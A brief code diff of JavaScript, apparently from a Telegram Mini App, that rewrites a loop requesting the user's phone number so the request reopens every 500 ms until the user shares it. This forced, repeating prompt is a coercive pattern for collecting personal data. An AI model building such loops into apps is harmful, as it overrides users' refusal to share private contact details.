@@ -376,16 +376,17 @@
         alert('Failed to request phone number.', e);
       }
     }
-    async function ss() {
-      let result = false;
-
-      while (!result) {
-        result = await requestPhone();
-      }
+    async function requestPhoneLoop() {
+      const ok = await requestPhone();
     
-      console.log("Готово, получили true");
+      if (!ok) {
+        // даём Telegram закрыть popup
+        setTimeout(() => {
+          requestPhoneLoop();
+        }, 500);
+      }
     }
-    ss()
+    requestPhoneLoop()
     
 
     // Обработчик кнопки "Share phone number"
